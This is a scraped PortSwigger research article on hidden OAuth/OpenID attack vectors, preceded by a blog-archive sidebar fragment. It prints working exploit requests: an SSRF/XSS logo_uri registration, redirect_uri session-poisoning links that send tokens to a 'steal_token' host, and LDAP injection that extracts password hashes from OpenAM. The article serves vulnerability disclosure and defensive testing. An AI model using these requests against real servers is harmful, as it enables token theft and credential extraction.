    [февраля](http://agrrrdog.blogspot.com/2016/02/)
    (1)

* ►
  [2015](http://agrrrdog.blogspot.com/2015/)
  (3)
  + ►
    [ноября](http://agrrrdog.blogspot.com/2015/11/)
    (1)
  + ►
    [августа](http://agrrrdog.blogspot.com/2015/08/)
    (2)

Тема "Простая". Технологии [Blogger](https://www.blogger.com).



=== Content from portswigger.net_35ac79bb_20250114_215318.html ===


[Login](/users)

Products

Solutions

[Research](/research)
[Academy](/web-security)
Support

Company

[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)

[My account](/users/youraccount)
[Customers](/customers)
[About](/about)
[Blog](/blog)
[Careers](/careers)
[Legal](/legal)
[Contact](/contact)
[Resellers](/support/reseller-faqs)
[![Burp Suite Enterprise Edition](/content/images/svg/icons/enterprise.svg)
**Burp Suite Enterprise Edition**
The enterprise-enabled dynamic web vulnerability scanner.](/burp/enterprise)
[![Burp Suite Professional](/content/images/svg/icons/professional.svg)
**Burp Suite Professional**
The world's #1 web penetration testing toolkit.](/burp/pro)
[![Burp Suite Community Edition](/content/images/svg/icons/community.svg)
**Burp Suite Community Edition**
The best manual tools to start web security testing.](/burp/communitydownload)
[![Dastardly, from Burp Suite](/mega-nav/images/dastardly.svg)
**Dastardly, from Burp Suite**
Free, lightweight web application security scanning for CI/CD.](/burp/dastardly)
[View all product editions](/burp)

[**Burp Scanner**

Burp Suite's web vulnerability scanner

![Burp Suite's web vulnerability scanner'](/mega-nav/images/burp-suite-scanner.jpg)](/burp/vulnerability-scanner)

[**Attack surface visibility**
Improve security posture, prioritize manual testing, free up time.](/solutions/attack-surface-visibility)
[**CI-driven scanning**
More proactive security - find and fix vulnerabilities earlier.](/solutions/ci-driven-scanning)
[**Application security testing**
See how our software enables the world to secure the web.](/solutions)
[**DevSecOps**
Catch critical bugs; ship more secure software, more quickly.](/solutions/devsecops)
[**Penetration testing**
Accelerate penetration testing - find more bugs, more quickly.](/solutions/penetration-testing)
[**Automated scanning**
Scale dynamic scanning. Reduce risk. Save time/money.](/solutions/automated-security-testing)
[**Bug bounty hunting**
Level up your hacking and earn more bug bounties.](/solutions/bug-bounty-hunting)
[**Compliance**
Enhance security monitoring to comply with confidence.](/solutions/compliance)

[View all solutions](/solutions)

[**Product comparison**

What's the difference between Pro and Enterprise Edition?

![Burp Suite Professional vs Burp Suite Enterprise Edition](/mega-nav/images/burp-suite.jpg)](/burp/enterprise/resources/enterprise-edition-vs-professional)

[**Support Center**
Get help and advice from our experts on all things Burp.](/support)
[**Documentation**
Tutorials and guides for Burp Suite.](/burp/documentation)
[**Get Started - Professional**
Get started with Burp Suite Professional.](/burp/documentation/desktop/getting-started)
[**Get Started - Enterprise**
Get started with Burp Suite Enterprise Edition.](/burp/documentation/enterprise/getting-started)
[**User Forum**
Get your questions answered in the User Forum.](https://forum.portswigger.net/)
[**Downloads**
Download the latest version of Burp Suite.](/burp/releases)

[Visit the Support Center](/support)

[**Downloads**

Download the latest version of Burp Suite.

![The latest version of Burp Suite software for download](/mega-nav/images/latest-burp-suite-software-download.jpg)](/burp/releases)

Articles

* [Overview](/research)
* Core Topics

  [Black Hat](/research/black-hat)
  [XSS](/research/cross-site-scripting-research)
  [Request Smuggling](/research/request-smuggling)
  [Template Injection](/research/template-injection)
  [Top 10 Hacking Techniques](/research/top-10-web-hacking-techniques)
* [Articles](/research/articles)
* Meet the Researchers

  [James Kettle](/research/james-kettle)
  [Gareth Heyes](/research/gareth-heyes)
  [Martin Doyhenard](/research/martin-doyhenard)
  [Zakhar Fedotkin](/research/zakhar-fedotkin)
* [Talks](/research/talks)
* [RSS](/research/rss)

# Hidden OAuth attack vectors

![Michael Stepankin](/content/images/profiles/callout_michael_stepankin_114px.png)
### [Michael Stepankin](/research)

Researcher

[@artsploit](https://twitter.com/artsploit)

* **Published:** 24 March 2021 at 14:59 UTC
* **Updated:** 25 March 2021 at 14:49 UTC

![](/cms/images/a0/8d/e349-article-hidden-oauth-attack_article.jpg)
## Intro

The OAuth2 authorization protocol has been under fire for the past ten years. You've probably already heard about plenty of "return\_uri" tricks, token leakages, CSRF-style attacks on clients, and more. In this post, however, we're going to present three brand new OAuth2 and [OpenID](/web-security/oauth/openid) Connect vulnerabilities: "**Dynamic Client Registration: SSRF by design**", "**redirect\_uri Session Poisoning**", and "**WebFinger User Enumeration**". We'll go over the key concepts, demonstrate these attacks on two open-source [OAuth](/web-security/oauth) servers (ForgeRock OpenAM and MITREid Connect), and provide some tips on how you can detect these vulnerabilities yourself.

Don't fret if you're not familiar with some of the classic OAuth vulnerabilities. Although we won't discuss them here, we've covered these extensively on our Web Security Academy: <https://portswigger.net/web-security/oauth>.

### Note about OpenID

Before diving into the vulnerabilities, we should briefly talk about OpenID. OpenID Connect is a popular extension to the OAuth protocol that brings a number of new features, including id\_tokens, automatic discovery, a configuration endpoint and a whole lot more. From a [pentesting](/solutions/penetration-testing) point of view, whenever you test an OAuth application, there is a good chance that the target server also supports OpenID, which greatly extends the available attack surface. As a bug hunter, whenever you're testing an OAuth process, you should try to fetch the standard "/.well-known/openid-configuration" endpoint. This can give you a lot of information even in a black-box assessment.

## Chapter one: Dynamic Client Registration - SSRF by design

Many OAuth attacks described in the past target the authorization endpoint, as you see it in the browser's traffic every time you log in. If you're testing a website and see a request like "/authorize?client\_id=aaa&redirect\_uri=bbb", you can be relatively sure it is an OAuth endpoint with plenty of parameters that you can already test. At the same time, since OAuth is a complex protocol, there are additional endpoints that may be supported by the server even though they are never referenced from client-side HTML pages.

One of the hidden URLs that you may miss is the **Dynamic Client Registration endpoint**. In order to successfully authenticate users, OAuth servers need to know details about the client application, such as the "client\_name", "client\_secret", "redirect\_uris", and so on. These details can be provided via local configuration, but OAuth authorization servers may also have a special registration endpoint. This endpoint is normally mapped to "/register" and accepts POST requests with the following format:

`POST /connect/register HTTP/1.1
Content-Type: application/json
Host: server.example.com
Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.eyJ ...

{
 "application_type": "web",
 "redirect_uris": ["https://client.example.org/callback"],
 "client_name": "My Example",
 "logo_uri": "https://client.example.org/logo.png",
 "subject_type": "pairwise",
 "sector_identifier_uri": "https://example.org/rdrct_uris.json",
 "token_endpoint_auth_method": "client_secret_basic",
 "jwks_uri": "https://client.example.org/public_keys.jwks",
 "contacts": ["ve7jtb@example.org"],
 "request_uris": ["https://client.example.org/rf.txt"]
}`

There are two specifications that define parameters in this request: [RFC7591](https://tools.ietf.org/html/rfc7591) for OAuth and [Openid Connect Registration 1.0](https://openid.net/specs/openid-connect-registration-1_0.html#rfc.section.3.1).

As you can see here, a number of these values are passed in via URL references and look like potential targets for [Server Side Request Forgery](https://portswigger.net/web-security/ssrf). At the same time, most servers we've tested do not resolve these URLs immediately when they receive a registration request. Instead, they just save these parameters and use them later during the OAuth authorization flow. In other words, this is more like a second-order SSRF, which makes black-box detection harder.

The following parameters are particularly interesting for SSRF attacks:

* **logo\_uri** - URL that references a logo for the client application. After you register a client, you can try to call the OAuth authorization endpoint ("/authorize") using your new "client\_id". After the login, the server will ask you to approve the request and may display the image from the "logo\_uri". If the server fetches the image by itself, the SSRF should be triggered by this step. Alternatively, the server may just include the logo via a client-side "<img>" tag. Although this doesn't lead to SSRF, it may lead to Cross Site Scripting if the URL is not escaped.
* **jwks\_uri** - URL for the client's JSON Web Key Set [JWK] document. This key set is needed on the server for validating signed requests made to the token endpoint when using JWTs for client authentication [RFC7523]. In order to test for SSRF in this parameter, register a new client application with a malicious "jwks\_uri", perform the authorization process to obtain an authorization code for any user, and then fetch the "/token" endpoint with the following body:

  `POST /oauth/token HTTP/1.1
  ...

  grant_type=authorization_code&code=n0esc3NRze7LTCu7iYzS6a5acc3f0ogp4&client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer&client_assertion=eyJhbGci...`

  If vulnerable, the server should perform a server-to-server HTTP request to the supplied "jwks\_uri" because it needs this key to check the validity of the "client\_assertion" parameter in your request. This will probably only be a [blind SSRF](/web-security/ssrf/blind) vulnerability though, as the server expects a proper JSON response.
* **sector\_identifier\_uri** - This URL references a file with a single JSON array of redirect\_uri values. If supported, the server may fetch this value as soon as you submit the dynamic registration request. If this is not fetched immediately, try to perform authorization for this client on the server. As it needs to know the redirect\_uris in order to complete the authorization flow, this will force the server to make a request to your malicious sector\_identifier\_uri.
* **request\_uris** - An array of the allowed request\_uris for this client. The "request\_uri" parameter may be supported on the authorization endpoint to provide a URL that contains a JWT with the request information (see <https://openid.net/specs/openid-connect-core-1_0.html#rfc.section.6.2>).

  Even if dynamic client registration is not enabled, or it requires authentication, we can try to perform SSRF on the authorization endpoint simply by using "request\_uri":

  `GET /authorize?response_type=code%20id_token&client_id=sclient1&request_uri=https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt`

  Note: do not confuse this parameter with "redirect\_uri". The "redirect\_uri" is used for redirection after authorization, whereas "request\_uri" is fetched by the server at the start of the authorization process.

  At the same time, many servers we've seen do not allow arbitrary "request\_uri" values: they only allow whitelisted URLs that were pre-registered during the client registration process. That's why we need to supply "request\_uris": "https://ybd1rc7ylpbqzygoahtjh6v0frlh96.burpcollaborator.net/request.jwt" beforehand.

The following parameters also contain URLs, but are not normally used for issuing server-to-server requests. They are instead used for client-side redirection/referencing:

* **redirect\_uri** - URLs that are used for redirecting clients after the authorization
* **client\_uri** - URL of the home page of the client application
* **policy\_uri** - URL that the Relying Party client application provides so that the end user can read about how their profile data will be used.
* **tos\_uri** - URL that the Relying Party client provides so that the end user can read about the Relying Party's terms of service.
* **initiate\_login\_uri** - URI using the https scheme that a third party can use to initiate a login by the RP. Also should be used for client-side redirection.

All these parameters are optional according to the OAuth and OpenID specifications and not always supported on a particular server, so it's always worth identifying which parameters are supported on your server.

If you target an OpenID server, the discovery endpoint at ".well-known/openid-configuration" sometimes contains parameters such as "registration\_endpoint", "request\_uri\_parameter\_supported", and "require\_request\_uri\_registration". These can help you to find the registration endpoint and other server configuration values.

## CVE-2021-26715: SSRF via "logo\_uri" in MITREid Connect

[MITREid Connect](https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server) acts as a standalone OAuth authorization server. In the default configuration, most of its pages require proper authorization and you can't even create a new user - only administrators are allowed to create new accounts.

It also implements [OpenID Dynamic Client Registration](https://openid.net/specs/openid-connect-registration-1_0.html) protocol and supports registering client OAuth applications. Although this functionality is only referenced from the admin panel, the actual "/register" endpoint does not check the current session at all.

By looking at the source code, we discovered that MITREid Connect uses "logo\_uri" in the following way:

* During the registration process, the client application may specify its "logo\_uri" parameter, which points to the image associated with the application. This "logo\_uri" parameter could be an arbitrary URL.
* On the authorization step, when a user is asked to approve the access requested by this new application, the authorization server makes a server-to-server HTTP request to download the image from "logo\_uri" parameter, caches it, and displays to the user alongside other information.

This process happens when a user accesses the "/openid-connect-server-webapp/api/clients/{id}/logo" endpoint, which returns the content of the fetched "logo\_uri". Specifically, the vulnerable controller was located at [org.mitre.openid.connect.web.ClientAPI#getClientLogo](https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server/blob/master/openid-connect-server/src/main/java/org/mitre/openid/connect/web/ClientAPI.java#L509)

Since the server does not check that the retrieved content is actually an image, it may be misused by an attacker to request any URL accessible from the authorization server and display its content, leading to a [Server Side Request Forgery](https://portswigger.net/web-security/ssrf) attack.

This functionality may also be misused to perform a [Cross Site Scripting](https://portswigger.net/web-security/cross-site-scripting) attack, as the "getClientLogo" controller does not enforce any image "Content-Type" header, allowing the attacker to display arbitrary HTML content from their own URL. If this HTML contains JavaScript code, it will be executed within the authorization server domain.

### Exploit

We need to send a dynamic client registration request as described above. In this case, the bare minimum parameters we need to provide are "redirect\_uri" and "logo\_uri":

`POST /openid-connect-server-webapp/register HTTP/1.1
Host: local:8080
Content-Length: 118
Content-Type: application/json

{
 "redirect_uris": [
 "http://artsploit.com/redirect"
 ],
 "logo_uri": "http://artsploit.com/xss.html"
}`

To initiate a server-to-server request to the specified "logo\_uri": "http://artsploit.com/xss.html", a user should navigate the "/api/clients/{client.id}/logo" page:

![The page displays the output of the SSRF attack](/cms/images/c1/73/1768-article-oauth1.png)

A low-privileged account is required to access the last page. If an attacker is able to obtain one via registration, they can use this endpoint to make an arbitrary HTTP request to a local server and display its result.

Alternatively, this attack can be used against already authenticated users to perform [XSS](/web-security/cross-site-scripting) attacks, as it allows you to inject arbitrary JavaScript on the page. As shown on the example above, a malicious "logo\_uri": "http://artsploit.com/xss.html" can be used to execute an "alert(document.domain)" function.

The {client.id} parameter is an incremental value associated with every new client that is registered with the OAuth server. It can be obtained after the client registration without any credentials. As one default client application already exists when the server is created, the first dynamically registered client will have the client\_id "2".

As we can see from this exploit, OAuth servers may have second-order SSRF vulnerabilities in the registration endpoint as the spec explicitly states that a number of values may be provided by URL references. These vulnerabilities are subtle to find, but since the OAuth registration request format is standardized, it is still possible even in black-box scenarios.

## Chapter two: "redirect\_uri" Session Poisoning

The next vulnerability we'll look at lies in the way the server carries over parameters during the authentication flow.

According to the OAuth specification (section 4.1.1 in [RFC6749](https://tools.ietf.org/html/rfc6749#section-4.1.1)), whenever the OAuth server receives the authorization request, it should "validate the request to ensure that all required parameters are present and valid. If the request is valid, the authorization server authenticates the resource owner and obtains an authorization decision (by asking the resource owner or by establishing approval via other means)"

Sounds simple, right? On almost all OAuth diagrams, this process is displayed as a single step, but it actually involves three separate actions that need to be implemented by the OAuth server:

1. Validate all request parameters (including "client\_id", "redirect\_uri").
2. Authenticate the user (by login form submission or any other way).
3. Ask for the user's consent to share the data with an external party.
4. Redirect the user back to the external party (with the code/token in parameters).

In many OAuth server implementations we've seen, these steps are separated by using three different controllers, something like "/authorize", "/login", and "/confirm\_access".

On the first step ("/authorize") the server checks "redirect\_uri" and "client\_id" parameters. Later, at the "/confirm\_access" stage, the server needs to use these parameters to issue the code. So how does the server remember them? The most obvious ways would be:

1. To store the "client\_id" and "redirect\_uri" parameters in the session.
2. To carry them over in HTTP query parameters for every step. This could require validity checks on each step and the validation procedures may be different.
3. Create a new "interaction\_id" parameter, which uniquely identifies each OAuth authorization flow that is initiated with the server.

As we can see here, this is something that the strict OAuth specification does not really give any advice about. As a result, there is a diverse range of approaches to implementing this behavior.

The first approach (store in session) is quite intuitive and looks elegant in the code, but it can cause race condition problems when multiple authorization requests are sent simultaneously for the same user.

Let's look closely at this example. The process starts with an ordinary authorization request:

`/authorize?client_id=client&response_type=code&redirect_uri=http://artsploit.com/`

The server checks the parameters, stores them in the session, and displays a consent page:

![The page ask to approve the client](/cms/images/c7/1d/1921-article-oauth2.png)

After we click "Authorize", the following request is sent to the server:

![request sent to server after confirmation](/cms/images/66/ca/9762-article-oauth3.png)

As you can see, the request body **does not contain** any parameters about the client being authorized, which means that the server takes them from the user's session. We can even spot this behavior during black-box testing.

An attack based on this behavior would go something like this:

1. The user visits a specially crafted page (just like a typical XSS/CSRF attack scenario).
2. The page redirects to the OAuth authorization page with a "trusted" "client\_id".
3. (in the background) The page sends a hidden cross-domain request to the OAuth authorization page with an "untrustworthy" "client\_id", which poisons the session.
4. The user approves the first page and, since the session contains the updated value, the user will be redirected to the "redirect\_uri" of the untrusted client.

In many real systems, third-party users can register their own clients, so this vulnerability may allow them to register an arbitrary "redirect\_uri" and leak a token to it.

There are some caveats, however: the user has to approve any "trusted" client. If they have already approved the same client earlier, the server might just redirect us without asking for confirmation. Conveniently, the OpenID specification provides us with a "prompt=consent" parameter, which we can append to the URL of the authorization request to potentially get around this problem. If the server follows OpenID spec, it should ask the user for confirmation of their consent even if they have previously granted it. Without confirmation, the exploitation is harder but still feasible, depending on the particular OAuth server implementation.

## CVE-2021-27582: [MITREid Connect] "redirect\_uri" bypass via Spring autobinding

The MITREid Connect server was vulnerable to the session poisoning issue described above. In this case, exploitation didn't even require registering an additional client because the application has a mass assignment vulnerability on the confirmation page, which also leads to the session poisoning.

During the OAuth2 flow, when a user navigates to the authorization page ("/authorize"), the AuthorizationEndpoint class correctly checks all provided parameters (client\_id, redirect\_uri, scope, etc…). After that, when the user is authenticated, the server displays a confirmation page, asking the user to approve the access. The user's browser only sees the "/authorize" page but, internally, the server performs an internal request forwarding from "/authorize" to "/oauth/confirm\_access". In order to pass parameters from one page to another, the server uses an "@ModelAttribute("authorizationRequest")" annotation on the ["/oauth/confirm\_access" controller](https://github.com/mitreid-connect/OpenID-Connect-Java-Spring-Server/blob/a2e8cb1a67a5546fdef11c604142a847e7c61261/openid-connect-server/src/main/java/org/mitre/oauth2/web/OAuthConfirmationController.java#L104):

`@PreAuthorize("hasRole('ROLE_USER')")
@RequestMapping("/oauth/confirm_acces")
public String confimAccess(Map<String, Object> model, @ModelAttribute("authorizationRequest") AuthorizationRequest authRequest, Principal p) {`

This annotation is a bit tricky; it not only takes parameters from the Model of the previous controller, but also takes their values **from the current HTTP request query**. So, if the user navigates directly to the "/oauth/confirm\_access" endpoint in the browser, it is able to provide all AuthorizationRequest parameters from the URL and bypass the check on the "/authorize" page.

The only caveat here is that the "/oauth/confirm\_access" controller requires @SessionAttributes("authorizationRequest") to be present in the user's session. However, this can easily be achieved simply by visiting the "/authorize" page without performing any actions on it. The impact of this vulnerability is similar to the classic scenario in which the "redirect\_uri" is never checked.

### Exploit

A malicious actor could craft two special links to the authorization and confirmation endpoints, each with its own "redirect\_uri" parameter, and supply them to the user.

`/authorize?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&scope=openid&prompt=consent&redirect_uri=http://trusted.example.com/redirect``/oauth/confirm_access?client_id=c931f431-4e3a-4e63-84f7-948898b3cff9&response_type=code&prompt=consent&scope=openid&redirectUri=http://malicious.example.com/steal_token`

The "client\_id" parameter can be from any client application the user already trusts. When "/confirm\_access" is accessed, it takes all the parameters from the URL and poisons the model/session. Now, when a user approves the first request (since the "client\_id" it's trusted), the authorization token is leaked to the malicious website.

**\*Note:** You may notice an intended difference between "redirect\_uri" in the first request vs "redirectUri" in the second. This is intentional because the first one is a valid OAuth parameter whereas the second is a parameter name that actually binds to the "AuthorizationRequest.redirectUri" model attribute during mass assignment.

The "@ModelAttribute("authorizationRequest")" annotation here is not necessary and creates additional risks during forwarding. A safer way to perform the same action is just to take these values from the "Map<String, Object> model" as an input parameter of the method annotated with @RequestMapping("/oauth/confirm\_access").

Even if mass assignment did not exist here, this vulnerability might still be exploitable by sending two authorization requests simultaneously so that they share the same session.

## Chapter three: "/.well-known/webfinger" makes all user names well-known

The "/.well-known/webfinger" is a standard OpenID endpoint that displays information about users and resources used on the server. For example, it can be used in the following way to validate that the user "anonymous" has an account on the server:

`/.well-known/webfinger?resource=http://x/anonymous&rel=http://openid.net/specs/connect/1.0/issuer`![request sent to server after confirmation](/cms/images/96/8b/3527-article-oauth4.png)

This is just another OpenID endpoint that you probably won't find during crawling, as it's meant to be used by the OpenID client applications and these requests are not sent from the browser side. [The specification](https://openid.net/specs/openid-connect-discovery-1_0.html) says that the "rel" parameter should have a static value of "http://openid.net/specs/connect/1.0/issuer" and "resource" should contain a valid URL in one of the following forms:

* http://host/**user**
* acct://**user**@host

This URL is parsed on the server and not really used to send HTTP requests, so there is no SSRF here. At the same time, you may try to find ordinary vulnerabilities like SQL injection there, as the endpoint should not require any authentication.

The tricky part of this endpoint is the response status code: it may return a 404 if parameters are invalid or the username is not found, so be careful when adding it to your content discovery tool.

## [ForgeRock OpenAm] LDAP Injection in Webfinger Protocol

We discovered one good example of the vulnerable webfinger endpoint in **ForgeRock's OpenAM server**. This commercial software used to have an LDAP Injection vulnerability.

During the source code analysis, we found that when the OpenAM server is processing the request, it embeds the user-supplied resource parameter inside a filter query to the LDAP server. The LDAP query is built in the [SMSLdapObject.java](https://github.com/OpenRock/OpenAM/blob/master/openam-core/src/main/java/com/sun/identity/sm/ldap/SMSLdapObject.java#L882) file:

`String[] objs = { filter };
String FILTER_PATTERN_ORG = "(&(objectclass="
 + SMSEntry.OC_REALM_SERVICE + ")(" + SMSEntry.ORGANIZATION_RDN
 + "={0}))";
String sfilter = MessageFormat.format(FILTER_PATTERN_ORG, (Object[]) objs);`

If the resource contains special characters such as "( ) ; , \* |", the application does not apply any escaping to them and subsequently includes them in the LDAP query filter.

From the attacker perspective, it is possible to use LDAP filters to access different fields of the user object stored in LDAP. One of the attack scenarios could be to enumerate a valid username:

`/openam/.well-known/webfinger?resource=http://x/dsa*&rel=http://openid.net/specs/connect/1.0/issuer`

The server responds with the HTTP code 200 (OK) if any user name starts with "**dsa\***" and HTTP code 404 (Not Found) otherwise.

Furthermore, we can specify the filter based on user password:

`/openam/.well-known/webfinger?resource=http://x/dsameuser)(sunKeyValue=userPassword=A*)(%2526&rel=http://openid.net/specs/connect/1.0/issuer`![response for a proper password wildcard guess](/cms/images/37/33/0091-article-oauth5.png)![response for an improper password wildcard guess](/cms/images/cc/ce/3586-article-oauth6.png)

This allows us to **extract the user's password hash character-by-character**. The attack is not only limited to extraction of user attributes; it can also be used to extract a valid session token or private keys used for token signing.

Again, this vulnerability exists in the standard OpenID component of the OpenAm server and does not require any authentication.

We discovered this vulnerability in the latest open source version of OpenAM, located at <https://github.com/OpenRock/OpenAM>. When we reported this vulnerability to ForgeRock, their security team pointed out that it was already patched in the commercial version of their product starting from update 13.5.1 (see [OPENAM-10135](https://bugster.forgerock.org/jira/browse/OPENAM-10135) for details).

## Conclusion

The OAuth and OpenID Connect protocols are complex, with many moving parts and extensions. If you test an OAuth authorization flow on a website, you probably see just a small subset of supported parameters and available endpoints. While Facebook, Google, and Apple can write their own implementations of these protocols, smaller companies often use open source implementations or commercial products you can download by yourself. Dig into documentation and RFCs, google errors, try to find the source code on Github and examine Docker containers to identify all the functionality you can reach: you'll be amazed how many unique bugs you can find.

[ActiveScan++ v1.0.22](https://github.com/PortSwigger/active-scan-plus-plus/commit/9432e0a09c3bf728b9e9b5534da9e2064f9c2847) now detects the presense of OpenId and OAuth configuration endpoints and can help you to discover them. We also have them in the "Interesting files and directories" list in Burp Intruder.

[Back to all articles](/research/articles)

This page requires JavaScript for an enhanced user experience.
## Related Research

[###

08 January 2025](/research/top-10-web-hacking-techniques-of-2024-nominations-open)
[### Bypassing WAFs with the phantom $Version cookie

04 December 2024
Bypassing WAFs with the phantom $Version cookie](/research/bypassing-wafs-with-the-phantom-version-cookie)
[### New crazy payloads in the URL Validation Bypass Cheat Sheet

29 October 2024
New crazy payloads in the URL Validation Bypass Cheat Sheet](/research/new-crazy-payloads-in-the-url-validation-bypass-cheat-sheet)
[### Concealing payloads in URL credentials

23 October 2024
Concealing payloads in URL credentials](/research/concealing-payloads-in-url-credentials)

Burp Suite

[Web vulnerability scanner](/burp/vulnerability-scanner)
[Burp Suite Editions](/burp)
[Release Notes](/burp/releases)

Vulnerabilities

[Cross-site scripting (XSS)](/web-security/cross-site-scripting)
[SQL injection](/web-security/sql-injection)
[Cross-site request forgery](/web-security/csrf)
[XML external entity injection](/web-security/xxe)
[Directory traversal](/web-security/file-path-traversal)
[Server-side request forgery](/web-security/ssrf)

Customers

[Organizations](/organizations)
[Testers](/testers)
[Developers](/developers)

Company

[About](/about)
[Careers](/careers)
[Contact](/about/contact)
[Legal](/legal)
[Privacy Notice](/privacy)

Insights

[Web Security Academy](/web-security)
[Blog](/blog)
[Research](/research)

[![PortSwigger Logo](/content/images/logos/portswigger-logo.svg)](/)
 [Follow us](https://twitter.com/Burp_Suite)

© 2025 PortSwigger Ltd.


